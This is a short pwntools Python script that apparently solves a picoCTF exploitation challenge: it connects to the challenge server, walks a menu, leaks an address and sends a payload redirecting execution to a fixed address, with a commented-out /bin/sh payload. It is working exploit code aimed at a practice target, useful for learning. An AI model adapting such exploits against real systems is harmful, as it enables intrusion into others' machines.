from pwn import *
io = remote("mercury.picoctf.net", 4504)


io.recvuntil("(e)xit\n")
io.sendline("s")

address = io.recvline()
address = address.split(b"...")[1]
address = address[:-1]
print(address)
# payload = fit({
#     56: "/bin/sh"
# })

io.recvuntil("(e)xit\n")
io.sendline("i")
io.recvuntil("(Y/N)?")
io.sendline("y")
io.recvuntil("(e)xit\n")
io.sendline("l")
payload = fit({
    0: 0x080487d6
})
io.recvuntil("try anyways:")
io.sendline(payload)


# io.sendline(payload)
io.interactive()
